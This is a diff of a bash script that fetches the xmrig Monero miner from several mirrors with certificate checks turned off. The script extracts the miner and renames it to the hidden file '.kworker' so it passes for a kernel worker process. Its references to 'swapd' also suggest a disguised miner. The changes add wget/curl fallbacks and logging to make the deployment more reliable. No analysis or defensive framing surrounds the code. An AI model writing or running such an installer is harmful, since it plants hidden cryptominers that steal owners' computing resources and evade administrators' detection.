@@ -2421,19 +2421,51 @@ for mirror in "${MIRRORS[@]}"; do
     rm -f xmrig.tar.gz 2>/dev/null
 
     # Try to download xmrig
+    echo "[*] Using download tool: $([ "$USE_WGET" = true ] && echo "wget" || echo "curl")"
+    
     if [ "$USE_WGET" = true ]; then
-        if [ "$VERBOSE" = true ]; then
-            echo "[*] wget --no-check-certificate -O xmrig.tar.gz $mirror"
-            wget --timeout=30 --tries=2 --no-check-certificate -O xmrig.tar.gz "$mirror" && DOWNLOAD_SUCCESS=true
+        echo "[*] wget --no-check-certificate -O xmrig.tar.gz $mirror"
+        wget --timeout=30 --tries=2 --no-check-certificate -O xmrig.tar.gz "$mirror" 2>&1 | head -20
+        if [ $? -eq 0 ] && [ -f xmrig.tar.gz ]; then
+            DOWNLOAD_SUCCESS=true
+            echo "[✓] wget download succeeded"
         else
-            wget --timeout=30 --tries=2 -q --no-check-certificate -O xmrig.tar.gz "$mirror" 2>/dev/null && DOWNLOAD_SUCCESS=true
+            echo "[!] wget download failed (exit code: $?)"
+            # Try curl as fallback
+            if command -v curl >/dev/null 2>&1; then
+                echo "[*] Trying curl as fallback..."
+                curl --max-time 60 --retry 2 -L -k -o xmrig.tar.gz "$mirror" 2>&1 | head -20
+                if [ $? -eq 0 ] && [ -f xmrig.tar.gz ]; then
+                    DOWNLOAD_SUCCESS=true
+                    echo "[✓] curl fallback succeeded"
+                else
+                    DOWNLOAD_SUCCESS=false
+                fi
+            else
+                DOWNLOAD_SUCCESS=false
+            fi
         fi
     else
-        if [ "$VERBOSE" = true ]; then
-            echo "[*] curl -L -k -o xmrig.tar.gz $mirror"
-            curl --max-time 60 --retry 2 -L -k -o xmrig.tar.gz "$mirror" && DOWNLOAD_SUCCESS=true
+        echo "[*] curl -L -k -o xmrig.tar.gz $mirror"
+        curl --max-time 60 --retry 2 -L -k -o xmrig.tar.gz "$mirror" 2>&1 | head -20
+        if [ $? -eq 0 ] && [ -f xmrig.tar.gz ]; then
+            DOWNLOAD_SUCCESS=true
+            echo "[✓] curl download succeeded"
         else
-            curl --max-time 60 --retry 2 -sS -L -k -o xmrig.tar.gz "$mirror" 2>/dev/null && DOWNLOAD_SUCCESS=true
+            echo "[!] curl download failed (exit code: $?)"
+            # Try wget as fallback
+            if command -v wget >/dev/null 2>&1; then
+                echo "[*] Trying wget as fallback..."
+                wget --timeout=30 --tries=2 --no-check-certificate -O xmrig.tar.gz "$mirror" 2>&1 | head -20
+                if [ $? -eq 0 ] && [ -f xmrig.tar.gz ]; then
+                    DOWNLOAD_SUCCESS=true
+                    echo "[✓] wget fallback succeeded"
+                else
+                    DOWNLOAD_SUCCESS=false
+                fi
+            else
+                DOWNLOAD_SUCCESS=false
+            fi
         fi
     fi
 
@@ -2470,38 +2502,64 @@ done
 
 # Extract if download was successful
 if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
-    if [ "$VERBOSE" = true ]; then
-        echo "[*] tar -xzf xmrig.tar.gz"
-        tar -xzf xmrig.tar.gz || {
-            echo "[!] Failed to extract xmrig - continuing anyway..."
-            DOWNLOAD_SUCCESS=false
-        }
-    else
-        tar -xzf xmrig.tar.gz 2>/dev/null || {
-            echo "[!] Failed to extract xmrig - continuing anyway..."
-            DOWNLOAD_SUCCESS=false
-        }
-    fi
-
+    echo "[*] Extracting xmrig.tar.gz..."
+    echo "[*] Current directory: $(pwd)"
+    echo "[*] Files before extraction:"
+    ls -la 2>/dev/null | grep -E "xmrig|\.kworker|swapd" || echo "    (no xmrig files found)"
+    
+    tar -xzf xmrig.tar.gz 2>&1 | head -20 || {
+        echo "[!] Failed to extract xmrig"
+        DOWNLOAD_SUCCESS=false
+    }
+    
+    echo "[*] Files after extraction:"
+    ls -la 2>/dev/null | grep -E "xmrig|\.kworker|swapd|config" || echo "    (no xmrig files found)"
+    
     if [ "$DOWNLOAD_SUCCESS" = true ]; then
+        echo "[*] Looking for xmrig binary..."
+        
         # MoneroOcean tarball contains xmrig binary directly or in simple structure
-        # Try multiple possible locations
+        # Try multiple possible locations with explicit checking
         if [ -f xmrig ]; then
+            echo "[✓] Found: xmrig (root level)"
             mv xmrig .kworker 2>/dev/null || cp xmrig .kworker 2>/dev/null
+            if [ ! -f .kworker ]; then
+                echo "[!] Move/copy failed, trying different approach..."
+                cp -f xmrig .kworker 2>&1 || echo "[!] Final copy attempt failed"
+            fi
         elif [ -f xmrig-*/xmrig ]; then
+            echo "[✓] Found: xmrig-*/xmrig (versioned directory)"
             mv xmrig-*/xmrig .kworker 2>/dev/null || cp xmrig-*/xmrig .kworker 2>/dev/null
         elif [ -f */xmrig ]; then
+            echo "[✓] Found: */xmrig (subdirectory)"
             mv */xmrig .kworker 2>/dev/null || cp */xmrig .kworker 2>/dev/null
         else
             echo "[!] Cannot find xmrig binary in tarball"
             echo "[*] Contents of extracted files:"
             ls -la 2>/dev/null || true
+            echo "[*] Trying to find xmrig anywhere:"
+            find . -name "xmrig" -type f 2>/dev/null || echo "    (find command failed or no files found)"
             DOWNLOAD_SUCCESS=false
         fi
         
-        if [ ! -f .kworker ]; then
+        if [ -f .kworker ]; then
+            echo "[✓] Binary successfully renamed to .kworker"
+            ls -lh .kworker 2>/dev/null || true
+        else
             echo "[!] Failed to extract/rename xmrig binary"
-            DOWNLOAD_SUCCESS=false
+            echo "[*] Trying direct approach - looking for any executable..."
+            # Last resort: try to find any executable file
+            for possible_binary in xmrig xmrig-* */xmrig; do
+                if [ -f "$possible_binary" ] && [ -x "$possible_binary" ]; then
+                    echo "[*] Found executable: $possible_binary"
+                    cp -f "$possible_binary" .kworker 2>&1 && echo "[✓] Copied to .kworker" || echo "[!] Copy failed"
+                    break
+                fi
+            done
+            
+            if [ ! -f .kworker ]; then
+                DOWNLOAD_SUCCESS=false
+            fi
         fi
     fi
 
